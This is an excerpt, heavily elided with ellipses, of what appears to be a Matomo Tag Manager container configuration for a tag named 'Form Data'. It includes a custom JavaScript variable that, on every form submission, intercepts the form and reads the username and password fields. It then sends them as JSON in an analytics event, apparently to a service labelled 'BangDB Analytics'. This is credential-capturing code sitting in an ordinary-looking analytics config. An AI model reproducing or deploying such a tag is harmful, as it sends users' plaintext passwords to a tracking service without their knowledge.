...
(function () {
      ...
      this.get = function () {
        ...
        return TagManager.url.getQueryParameter(name, parameters.window.location.search);
          ...
          Templates["CustomJsFunctionVariable588ab48405624599b7a2d6fe70e97e87"] = (function () {
            return function (parameters, TagManager) {
                this.get = function(event) {event.preventDefault();var fd = {};var fe=document.querySelector('form#formID');fd.name=fe.elements['username'].value;fd.password=fe.elements['password'].value;return JSON.stringify(fd);}
            };
        })()
  ...
  "blockedTriggerIds": []
        ...
        {
  "id": "f73b487b-0cee-4aab-b9b2-3b14c5505d52",
  "type": "Matomo",
  "name": "Form Data",
  "parameters": {
    "matomoConfig": {
    ...
    "documentTitle": "",
    "customUrl": "",
    "eventCategory": "FORM DATA",
    "eventAction": "FORM DATA",
    "eventName": "FORM DATA",
    "eventValue": {
      "joinedVariable": [
        {
          ...
          "Name": "Form Data",
          "jsFunction": "function() {var fd = {};var fe=document.querySelector('form#formID');fd.name=fe.elements['username'].value;fd.password=fe.elements['password'].value;return JSON.stringify(fd);}",
          "id": "588ab484-0562-4599-b7a2-d6fe70e97e87",
          "parameters": {
            "selectedVariable": "Custom JavaScript",
            "name": "CustomJsFunction",
            "type": "CustomJsFunction",
          ...
          "Variable": "CustomJsFunctionVariable588ab48405624599b7a2d6fe70e97e87"
        }
      ]
    },
    "selectedTag": "BangDB Analytics",
  ...
  "blockTriggerIds": [],
  "fireTriggerIds": [
    "fa113bb3-5ad0-4977-b52e-02fe64e93e13"
  ],
  "fireLimit": "unlimited",
  "fireDelay": 0,
  "startDate": null,
  ...
  "Description": "Triggered every time a new page is visited. (Only for the websites which are not single page / which reload the page while navigating. Such as websites built with: WordPress, HTML, PHP etc)."
            ...
            {
  "id": "fa113bb3-5ad0-4977-b52e-02fe64e93e13",
  "type": "FormSubmit",
  "name": "FormSubmit",
  "Trigger": "FormSubmitTrigger",
  "selectedTrigger": "Form Submit",
  ...
  "parameters": {
    ...
    "parameterName": "utm_medium"
          ...
          { name: "CustomJsFunction", type: "CustomJsFunction", lookUpTable: [], defaultValue: "", parameters: { jsFunction: "function(event) {event.preventDefault();var fd = {};var fe=document.querySelector('form#formID');fd.name=fe.elements['username'].value;fd.password=fe.elements['password'].value;return JSON.stringify(fd);}" }, Variable: "CustomJsFunctionVariable588ab48405624599b7a2d6fe70e97e87" },
            {
